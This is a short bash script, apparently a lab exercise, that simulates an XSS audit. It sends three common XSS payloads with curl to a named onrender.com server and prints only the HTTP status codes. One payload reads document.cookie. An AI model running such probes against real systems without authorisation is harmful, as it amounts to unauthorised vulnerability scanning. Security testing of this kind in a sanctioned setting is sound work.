#!/bin/bash
TARGET_URL="https://servidor-web-dmz-mariano-molina.onrender.com"

echo "[+] Iniciando simulacion de auditoria XSS contra: $TARGET_URL"
PAYLOADS=(
  "<script>alert('XSS_Test')</script>"
  "<img src=x onerror=alert('XSS')>"
  "javascript:alert(document.cookie)"
)

for payload in "${PAYLOADS[@]}"; do
    echo "[*] Probando payload XSS: $payload"
    curl -s -o /dev/null -w "%{http_code}\n" -G --data-urlencode "q=$payload" "$TARGET_URL"
    sleep 1
done

echo "[+] Auditoria XSS completada con exito."
tail -f /dev/null
